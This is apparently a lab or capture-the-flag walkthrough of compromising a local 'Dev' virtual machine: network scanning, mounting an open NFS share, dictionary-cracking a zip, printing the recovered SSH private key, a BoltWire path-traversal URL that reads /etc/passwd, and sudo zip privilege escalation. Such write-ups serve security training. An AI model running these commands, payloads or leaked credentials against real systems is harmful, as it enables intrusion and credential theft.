# Dev

## target 192.168.64.135

## Reconnaissance
### arp-scan -l

    root@kali:/home/kali# arp-scan -l
    Interface: eth0, type: EN10MB, MAC: 00:0c:29:e4:4b:56, IPv4: 192.168.64.129
    Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
    192.168.64.1    00:50:56:c0:00:08       VMware, Inc.
    192.168.64.2    00:50:56:f7:bd:1d       VMware, Inc.
    192.168.64.135  00:0c:29:67:fc:dd       VMware, Inc.
    192.168.64.254  00:50:56:ea:b9:b5       VMware, Inc.
    
    4 packets received by filter, 0 packets dropped by kernel
    Ending arp-scan 1.9.7: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
    root@kali:/home/kali# 

### nmap -A -sV -T4 -p- 192.168.64.135

    root@kali:/home/kali# nmap -A -sV -T4 -p- 192.168.64.135 
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-03 08:31 EST
    Nmap scan report for 192.168.64.135
    Host is up (0.00036s latency).
    Not shown: 65526 closed ports
    PORT      STATE SERVICE  VERSION
    22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
    |   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
    |_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
    80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Bolt - Installation error
    111/tcp   open  rpcbind  2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  3           2049/udp   nfs
    |   100003  3           2049/udp6  nfs
    |   100003  3,4         2049/tcp   nfs
    |   100003  3,4         2049/tcp6  nfs
    |   100005  1,2,3      44523/udp6  mountd
    |   100005  1,2,3      50747/udp   mountd
    |   100005  1,2,3      58285/tcp   mountd
    |   100005  1,2,3      60071/tcp6  mountd
    |   100021  1,3,4      34409/tcp   nlockmgr
    |   100021  1,3,4      34899/udp6  nlockmgr
    |   100021  1,3,4      39583/tcp6  nlockmgr
    |   100021  1,3,4      55575/udp   nlockmgr
    |   100227  3           2049/tcp   nfs_acl
    |   100227  3           2049/tcp6  nfs_acl
    |   100227  3           2049/udp   nfs_acl
    |_  100227  3           2049/udp6  nfs_acl
    2049/tcp  open  nfs_acl  3 (RPC #100227)
    8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported:CONNECTION
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
    34409/tcp open  nlockmgr 1-4 (RPC #100021)
    51217/tcp open  mountd   1-3 (RPC #100005)
    52943/tcp open  mountd   1-3 (RPC #100005)
    58285/tcp open  mountd   1-3 (RPC #100005)
    MAC Address: 00:0C:29:67:FC:DD (VMware)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.80%E=4%D=12/3%OT=22%CT=1%CU=40525%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
    OS:M=674F0837%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
    OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
    OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
    OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
    OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
    OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
    OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
    OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
    OS:N%T=40%CD=S)
    
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
## Findings: 

    22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Bolt - Installation error
    111/tcp   open  rpcbind  2-4 (RPC #100000)
    2049/tcp  open  nfs_acl  3 (RPC #100227)
    8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported:CONNECTION

## Port 80 http webpage - Bolt installation error page
![image](https://github.com/user-attachments/assets/3ae0bf0f-8ac5-417e-a362-29b70d60f376)

## Port 8080 PHP version and Debian system - suggesting this is a Linux operating system
![image](https://github.com/user-attachments/assets/dd7f8629-cbd4-4c1e-b831-5f9ba92750a1)

## 2049 NFS

    install:
    sudo apt update && sudo apt install nfs-common -y

    Check Available NFS Shares:
    showmount -e 192.168.64.135
![image](https://github.com/user-attachments/assets/011c86b2-a08a-4777-8d3f-83599e942acd)

    Create a Mount Point: Create a directory where you will mount the NFS share:
    mkdir -p /home/kali/nfs_mount

    mount -t nfs 192.168.64.135:/srv/nfs /home/kali/nfs_mount
![image](https://github.com/user-attachments/assets/43fd4e7e-49ad-4775-8b07-e55c0acbed11)

#TBC here. Now that we have managed to get into the NFS and found a save.zip file, we need to crack it.
    
## Download fcrackzip - a lightweight .zip file type cracking tool.

    root@kali:/home/kali/nfs_mount# apt update && apt install fcrackzip -y

    install dirbuster word lists
    sudo apt update
    sudo apt install dirbuster -y

## looks like there are some issues locating the dirbuster wordlist in this instance. So will we use rockyou.txt instead.

    root@kali:/home/kali/nfs_mount# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
    
    -v Verbose
    -u Attempts to unzip with potential password
    -D Instructs it to be a dictionary attack
    -p Pathway to wordlist

    root@kali:/home/kali/nfs_mount# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
    found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
    found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
    
    
    PASSWORD FOUND!!!!: pw == java101
    root@kali:/home/kali/nfs_mount# 

    root@kali:/home/kali/nfs_mount# unzip save.zip
    Archive:  save.zip
    [save.zip] id_rsa password: 
      inflating: id_rsa                  
      inflating: todo.txt 
    root@kali:/home/kali/nfs_mount# nano todo.txt

## id_rsa OPENSSH Private Key finding

    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
    0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
    0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
    3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq
    S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n
    Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC
    xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG
    ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1
    tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI
    EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7
    ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY
    SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u
    dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh
    wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+
    AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b
    rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud
    T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc
    753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT
    hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E
    PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+
    rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4
    +e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC
    LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z
    iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/
    gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ
    q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=
    -----END OPENSSH PRIVATE KEY-----

## todo.txt | potential user JP
![image](https://github.com/user-attachments/assets/642b0a63-6713-4df4-9b8c-6aa9e24cf825)

## Try to SSH using JP initials

Try using java101 as password - Failed
    
    root@kali:/home/kali/nfs_mount# ssh jp@192.168.64.135
    The authenticity of host '192.168.64.135 (192.168.64.135)' can't be established.
    ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.64.135' (ED25519) to the list of known hosts.
    jp@192.168.64.135's password: 
    Permission denied, please try again.

Try using id_rsa file with SSH login / firstly change permissions on id_rsa for it to become executable

    root@kali:/home/kali/nfs_mount# ls -al id_rsa
    -rwxr--r-- 1 nobody nogroup 1876 Jun  2  2021 id_rsa

    root@kali:/home/kali/nfs_mount# chmod +x id_rsa
    root@kali:/home/kali/nfs_mount# ls -al id_rsa
    -rwxr-xr-x 1 nobody nogroup 1876 Jun  2  2021 id_rsa

Now use id_rsa private key file in an attempt to login via ssh

    root@kali:/home/kali/nfs_mount# ssh -i id_rsa jp@192.168.64.135
    jp@192.168.64.135's password: 
    Permission denied, please try again.


Seems like this attempt failed / according to some research, i will try restricting permissions as sometimes ssh may refuse connection if permissions are too open. (chmod 600)

    root@kali:/home/kali/nfs_mount# chmod 600 id_rsa
    root@kali:/home/kali/nfs_mount# ls -al id_rsa
    -rw------- 1 nobody nogroup 1876 Jun  2  2021 id_rsa
    root@kali:/home/kali/nfs_mount# 

Attempt to login with id_rsa and jp@192.168.64.135 

    root@kali:/home/kali/nfs_mount# ssh -i id_rsa jp@192.168.64.135
    jp@192.168.64.135's password: 
    Permission denied, please try again.

No success. When having a deeper look, it seems as though the file ownership is set to nobody:nogroup, meaning it is not owned by the current user root.

Attempting to change ownership

    root@kali:/home/kali/nfs_mount# chown root:root id_rsa
    chown: changing ownership of 'id_rsa': Operation not permitted
    root@kali:/home/kali/nfs_mount# 

No kudos :(

## TBC here - We know port 80 and 8080 is open, perhaps do some more digging here.

## Gobuster for directory enumeration on port 80
    
    root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.64.135/
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.64.135/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /public               (Status: 301) [Size: 317] [--> http://192.168.64.135/public/]
    /src                  (Status: 301) [Size: 314] [--> http://192.168.64.135/src/]
    /app                  (Status: 301) [Size: 314] [--> http://192.168.64.135/app/]
    /vendor               (Status: 301) [Size: 317] [--> http://192.168.64.135/vendor/]
    /extensions           (Status: 301) [Size: 321] [--> http://192.168.64.135/extensions/]
    /server-status        (Status: 403) [Size: 279]
    Progress: 220560 / 220561 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    root@kali:/home/kali# 

## Gobuster for directory enumeration on port 8080

    root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.64.135:8080/
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.64.135:8080/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /dev                  (Status: 301) [Size: 321] [--> http://192.168.64.135:8080/dev/]
    /server-status        (Status: 403) [Size: 281]
    Progress: 220560 / 220561 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    root@kali:/home/kali#

## Port80 results:
    /public
    /src
    /app
    /vendor
    /extensions

## Port 8080 results:
    /dev    
![image](https://github.com/user-attachments/assets/2908eca0-7970-462c-a460-98cbfee82bb5)

After traversing through some of the directories. 192.168.64.135:8080/dev on port 8080 stands out the most. Here it looks like we are able to register an account on the BoltWire PHP Content Management System.

    account: 1
    password: 1

## Trying to find version of BoltWire. nmap --script http-enum -p 8080 192.168.64.135
    kali@kali:/usr/share/nmap/scripts$ nmap --script http-enum -p 8080 192.168.64.135
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-13 09:01 EST
    Nmap scan report for 192.168.64.135
    Host is up (0.00042s latency).
    
    PORT     STATE SERVICE
    8080/tcp open  http-proxy
    | http-enum: 
    |_  /dev/: Potentially interesting folder
    
    Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds

## Moving on.. 
when playing around with the /dev website, i noticed when clicking on the Search tab, it inputs the action within the url. Leading me to search for known potential exploits that may contain search.action vulnerabilities.

![image](https://github.com/user-attachments/assets/92edf81e-0647-4668-85f5-698d0aaebd1f)

When conducting a simple Google search of Boltwire, a Boltwire 6.03 exploit immediately shows up exploiting a Local File Inclusion.
https://www.exploit-db.com/exploits/48411

![image](https://github.com/user-attachments/assets/bb7c0d68-3bfc-45c4-8cc7-ee87cd631030)

Exploit attempt:

    http://192.168.64.135:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd

Exploit divulged the /etc/passwd details, in which we can see JP is infact jeanpaul with /bin/bash privileges.

![image](https://github.com/user-attachments/assets/ffebd003-6d13-4b7c-aa23-bb8675c28fe4)

## Attempting to SSH with jeanpaul and the previously cracked password of ilovejava

![image](https://github.com/user-attachments/assets/e5537346-9fd5-4b76-912f-16e7f1e42c21)
No kudos.

# Continue searching through other found directories from GoBuster results - http://192.168.64.135/dir
    /public
    /src
    /app
    /vendor
    /extensions

## Findings 1: Exposed .json endpoint in /app/cache/
![image](https://github.com/user-attachments/assets/4ccd95e9-0cf6-4745-85e2-d7a019278edb)
    
    nikto -h http://192.168.64.135/app/cache/config-cache.json

Ran nikto to try quickly identify any obvious vulnerabilities with the exposed .json file. With no results
![image](https://github.com/user-attachments/assets/9833b36a-8d65-4331-b166-939b8227dfeb)

## Findings 2: Information disclosure of PHP version and file dislosure (source code)
![image](https://github.com/user-attachments/assets/8de8a68c-c7c5-4e2c-a5c3-08ff15f3123c)

## Findings 3: Applicaiton Configurations file exposed
![image](https://github.com/user-attachments/assets/65ddc1e1-0998-49ab-ad32-82c5cb70628b)

![image](https://github.com/user-attachments/assets/a63146b3-b81a-4710-a30b-9fdca2414866)
Found additional passwords "I_love_java"

## Lets try using the newly found password in the SSH attempt with:
    root@kali:/home/kali/nfs_mount# ssh -i id_rsa jeanpaul@192.168.64.135

    root@kali:/home/kali/nfs_mount# ssh -i id_rsa jeanpaul@192.168.64.135
    Enter passphrase for key 'id_rsa': 
    Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
    jeanpaul@dev:~$ ^C

succesful login.

Tried to sudo su into root failed with the two passwords gathered previously.
Tried to list history, nothing great found as it seems like previous history was deleted.
Tried to log into 
Tried to sudo -l to look at what the jeanpauls account priviliges are. 
    
    jeanpaul@dev:/$ sudo -l
    Matching Defaults entries for jeanpaul on dev:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    User jeanpaul may run the following commands on dev:
        (root) NOPASSWD: /usr/bin/zip
    jeanpaul@dev:/$ 

## Use tool GTFOBINs
Can see that jeanpaul could use /usr/bin/zip as root privilige. Going to GTFOBINs
[screenshot here of sudo -l]

Search for +sudo and then look for zip binary. In this instance we are looking for LOLBins to help us utilise the existing privileges that are associated with jeanpauls account. 

![image](https://github.com/user-attachments/assets/eb5cc4d7-dac5-4e0e-9c1e-b30a7affcdce)

![image](https://github.com/user-attachments/assets/ff9fcc41-6fdd-4886-9497-22ccf82be979)

Proceeded to utilise LoLbin exploit to bypass restrictions and elevate access as a Root user.

<https://abdhamza.medium.com/tcm-security-dev-box-writeup-479ba6afb8f7>
